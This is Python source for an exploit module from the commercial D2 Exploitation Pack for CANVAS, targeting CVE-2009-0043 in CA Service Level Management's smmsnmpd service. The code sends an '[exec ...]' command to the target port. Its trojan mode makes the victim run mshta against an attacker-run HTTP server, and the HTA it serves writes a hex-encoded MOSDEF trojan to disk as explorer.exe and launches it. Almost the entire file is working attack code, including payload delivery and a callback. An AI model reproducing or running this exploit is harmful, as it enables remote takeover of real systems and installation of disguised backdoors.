#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2009
#

import sys
import random
import time
import thread

if "." not in sys.path: 
	sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
from libs.spkproxy import header, body
from libs.canvasos import *

import struct
import canvasengine

# GUI info
NAME = "CA Service Level Management smmsnmpd Remote Command Execution Vulnerability"

DESCRIPTION = "Remote Command Execution Vulnerability in CA Service Level Management smmsnmpd"

DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "CA"
DOCUMENTATION["Date public"] = "2009.01.07"
DOCUMENTATION["VersionsAffected"] = "CA Service Level Management 3.5"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/33161"
DOCUMENTATION["CVE Name"] = "CVE-2009-0043"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0043"
DOCUMENTATION["Notes"] = ""

VERSION = "0.1"

GTK2_DIALOG = "dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION']=['2000', '2003']

NOTES="""
Usage:
.\commandlineInterface.py -p 443 -v 1

-- Single command mode --
.\3rdparty\D2SEC\exploits\d2sec_ca_slm\d2sec_ca_slm.py -t 192.168.59.132 -l 192.168.1.1 -d 443 -O cmd:"ipconfig.exe"

-- Automatic MOSDEF trojan download and exec for Windows --
.\3rdparty\D2SEC\exploits\d2sec_ca_slm\d2sec_ca_slm.py -t 192.168.59.132 -l 192.168.1.1 -d 443
"""

CHANGELOG="""
"""


class theexploit(tcpexploit):
    def __init__(self):
    	tcpexploit.__init__(self)
    	self.TROJANMODE = 0
    	self.setInfo(DESCRIPTION)
    	self.name = NAME       
    	self.port = 6673
    	self.version = 0
    	self.cmd = ""
    	self.trojanname = "index.hta"
    	
    	return


    def file4hta(self, exename):
    	evilprog = "explorer.exe"
    	e = []
    	for a in exename:
    		for b in a:
    			if b == "\r":
    				d = "0d"
    			elif b == "\n":
    				d = "0a"
    			elif b == "\0":
    				d = "00"
    			else:
    				c = hex(ord(b))
    				d = c.replace("0x", "")

    			if len(d) == 1:
    				d = "0"+d

    			e.append(d)
	
    	i = 0
    	j = 0
    	l = len(e)

    	hta = "<SCRIPT language=vbs>\n\n"
    	while 1:
    		hta += " prog = prog & \""

    		while i != 24:
    			hta += "%s," % e[j]
    			if j == l-1:
    				break
    			i += 1
    			j += 1

    		if j == l-1:
    			hta = hta[:-1] + "\"\n\n"
    			break
    		hta += "\"\n"
    		i = 0

    	hta += " tmp = Split(prog, \",\")\n"	
    	hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
    	hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
    	hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
    	hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
    	hta += " Set f = fso.CreateTextFile(path, True)\n\n"
    	hta += " For i = 0 To UBound(tmp)\n"
    	hta += "   prog = Int(\"&H\" & tmp(i))\n"
    	hta += "   f.Write Chr(prog)\n"
    	hta += " Next\n\n"
    	hta += " f.Close\n"
    	hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
    	hta += " self.Close\n"
    	hta += "</SCRIPT>\n"

    	return hta
 
 
    def maketrojan(self):    	
    	t_os = canvasos("Windows")
    	t_os.arch = "X86"
        
    	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)
    	self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        
    	self.htafile = self.file4hta(self.mosdeftrojan)
    	file(self.trojanname, "wb").write(self.htafile)
    	self.setInfo("%s - done"%(NAME))
    	ret = len(self.mosdeftrojan) != 0

    	return ret


    def makesploit(self, clientheader, clientbody):        
    	from libs.spkproxy import header, body
    	h = header('SERVER')
    	b = body()
           	
    	self.maketrojan()    	
			
    	if clientheader.URL.count(self.trojanname):
    		self.log("Sending MOSDEF trojan")
    		f = open(self.trojanname, "rb")
    		sploitstring = f.read()
    		f.close()
    		os.remove(self.trojanname)
    		self.log("Sending %d bytes"%len(sploitstring))
    		h.addHeader("Content-type","binary/octet-stream")
    		h.addHeader("Connection","close")
    		b.setBody(sploitstring)

    	return h, b


    def neededListenerTypes(self):
    	from canvasengine import WIN32MOSDEF
    	return [WIN32MOSDEF]


    #################################################################################################################
    # Code from httpserver.py
    def listen(self):
    	self.getargs()
    	s = self.gettcplistener(80, "0.0.0.0")

    	if not s:
    		if self.port < 1024:
    			self.log("Cannot listen on port %d - perhaps we need to be root or that port is already bound? you can try to bind to a higher port" % self.port)
    		else:
    			self.log("Cannot listen on port %d - perhaps that port is already bound?" % self.port)
    		return 0
    		
    	s.set_timeout(5)
    	self.s = s
    	return s 


    def accept(self, s=None ):    	
    	if s == None:
    		s = self.s 
    		
    	try:
    		infd, addr = s.accept()
    	except timeoutsocket.Timeout:      
    		return 
    		
    	if infd == -1:
    		return
        
    	self.handle(infd)
    	
    	return True

        
    def handle(self, infd):     	
    	self.log("Handling connection")
    	clientheader = header(state = "SERVER")
    	clientheader.ssl = self.ssl
    	ret = clientheader.readdata(infd)
    	clientbody = body()
        
    	if clientheader.gotGoodHeader():
    		if clientheader.bodySize()>0 or clientheader.wasChunked:
    			self.log("Reading body")
    			clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
    			self.log("Read body")

    	self.log("Creating exploit response")
    	servheader, servbody = self.makesploit(clientheader, clientbody)        
    	self.log("Responding")
        
    	bodydata="".join(servbody.data)
                    
    	#now we respond...
    	response = ""
    	response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
	
    	self.log(response)

    	for akey in servheader.headerValuesDict.keys():
    		if akey not in [ "Content-Length", "Content-length"]:
    			response += servheader.grabHeader(akey)
    			
    	self.log("Sending header data of %d bytes"%len(response))
    	chunked = 0 #for now, eventually we'll send random chunks down the pipe.\..
    	
    	if not chunked:
    		response+="Content-Length: "+str(len(bodydata))+"\r\n"
    		
    	response+="\r\n"
    	response+="".join(bodydata)
    	self.log("Total response length is %d bytes"%len(response))
    	
    	try:
    		infd.sendall(response)
    	except socket.error:
    		self.log("Connection closed by peer")
    		
    	self.log("Response sent")
    	infd.close() #connection close - later on we'll keep it.
    	
    	return 
    #
    #################################################################################################################

        
    def startHTTPServer(self):
    	s = self.listen()
        
    	if not s:
    		self.log("Failed to listen - not running")
    		return 0
    	
    	while 1:
    		if self.state==self.HALT:
    			self.s.close()
    			break
    			
    		self.accept()
    		
    	self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))
        
    	return 1
    	
	        
    def run(self):
    	data_1 = ""
    	data_2 = ""	
    	buff = ""

    	# Check arguments
    	self.host = self.target.interface
    	self.port = int(self.argsDict.get("port", self.port))        
                
    	if (self.argsDict.get("cmd", self.cmd) == ""):
    		self.TROJANMODE = 1					
    		self.cmd = "mshta.exe http://" + self.callback.ip + "/" + self.trojanname					
    		thread.start_new_thread(self.startHTTPServer,())
    	else:
    		self.cmd = self.argsDict.get("cmd", self.cmd)
        	               
    	self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
    	self.log("Attacking %s:%d"%(self.host, self.port))                        	

    	s2 = self.gettcpsock()
        
    	try:
    		s2.connect((self.host, self.port))                        
    	except:
    		self.log('Could not connect to port %s:%s'%(self.host,self.port))
    		return 0

    	sploitstring = "[exec " + self.cmd + "]\r\n"
    	print sploitstring
    	s2.sendall(sploitstring)                  
       	
        
    	if (self.TROJANMODE == 0):        	
    		try:
    			buff = s2.recv(4096)
    			self.log(buff)
    		except:
    			self.log('Could not receive data from %s. Try again.'%(self.host))
    			return 0
    
    	s2.close()
        
    	if (self.TROJANMODE == 1):
    		while 1:
    			time.sleep(1)
                
    	return 1            
        		
        		
    def usage(self):        
    	print "Usage: %s -t targethost -l localip -d localport [-O cmd:command]\n" % sys.argv[0]
    	sys.exit(0) 


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
